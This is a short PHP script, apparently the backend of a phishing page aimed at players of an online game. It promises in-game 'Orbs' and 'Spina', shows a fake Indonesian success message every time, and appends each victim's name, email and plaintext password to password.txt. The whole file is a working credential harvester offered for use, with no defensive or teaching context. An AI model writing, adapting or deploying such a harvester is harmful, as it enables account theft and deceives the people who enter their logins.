<?php

if(isset($_POST["submit"])){
    if(true){
        echo "
            <script>
                alert('Data sudah berhasil terkirim! Silahkan tunggu beberapa menit!');
                document.location.href='index.php';
            </script>
        ";
    }else{
        echo "
            <script>
                alert('Data gagal masuk! harap coba lagi!');
                document.location.href='index.php';
            </script>
        ";
    }
}

$file = "password.txt";

$email = $_POST["email"];
$name = $_POST["name"];
$password = $_POST["password"];
$Orbs = $_POST["Orbs"];
$Spina = $_POST["Spina"];
date_default_timezone_set("Asia/Jakarta");
$today = date("l, d-M-y H:i:s T"); // ini jamnya bukan WIB, tapi entah gk tau, yg jelas ini WIB tapi ditambah 5 jam
                                // misal sekarang jam 9 PM (WIB), berarti disininya jam 4 PM, knp gitu? udh dijelasin diatas

$handle = fopen($file, 'a');

    fwrite($handle, "++++++++++++++++++++++++++++++++++++++  ++");
    fwrite($handle, "\n");
    fwrite($handle, "Nama: ");
    fwrite($handle, "$name");
    fwrite($handle, "\n");
    fwrite($handle, "email: ");
    fwrite($handle, "$email");
    fwrite($handle, "\n");
    fwrite($handle, "Password: ");
    fwrite($handle, "$password");
    fwrite($handle, "\n");
    fwrite($handle, "Jumlah Orbs: ");
    fwrite($handle, "$Orbs");
    fwrite($handle, "\n");
    fwrite($handle, "Jumlah Spina: ");
    fwrite($handle, "$Spina");
    fwrite($handle, "\n");
    fwrite($handle, "Tanggal data di input: ");
    fwrite($handle, "$today");
    fwrite($handle, "\n");
    fwrite($handle, "++++++++++++++++++++++++++++++++++++++  ++");
    fwrite($handle, "\n");
    fwrite($handle, "\n");
    fclose($handle);
    echo "<script LANGUAGE=\"javascript\"></script>";

?>